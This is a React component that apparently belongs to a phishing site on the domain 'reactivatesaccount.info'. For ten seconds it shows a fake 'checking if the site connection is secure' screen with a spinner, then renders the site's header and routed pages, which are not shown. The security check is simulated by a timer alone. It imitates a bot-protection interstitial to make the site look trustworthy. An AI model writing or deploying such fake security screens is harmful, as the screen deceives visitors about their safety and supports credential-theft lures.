import React, { useEffect, useState } from "react";
import Header from "./components/Header/Header";
import { Outlet } from "react-router-dom";
import { chakra, Spinner, Text, VStack } from "@chakra-ui/react";

const Main = () => {
  const [value, setValue] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => setValue(false), 10000);
    return () => clearTimeout(timer);
  }, []);
  return (
    <>
      {value ? (
        <VStack
          fontFamily="poppins"
          display="flex"
          justify="center"
          align="center"
          minH="60vh"
        >
          <Text>Checking if the site connection is secure</Text>
          <chakra.span fontSize="xl" fontWeight="bold">
            reactivatesaccount.info
          </chakra.span>{" "}
          <Spinner size="lg" color="#1c70c8" my="10" />
          <Text textAlign="center">
            <chakra.span fontWeight="bold">reactivatesaccount.info</chakra.span>{" "}
            needs to review the <br /> security of your connection before
            proceeding.
          </Text>
        </VStack>
      ) : (
        <>
          <Header />
          <Outlet />
        </>
      )}
    </>
  );
};

export default Main;
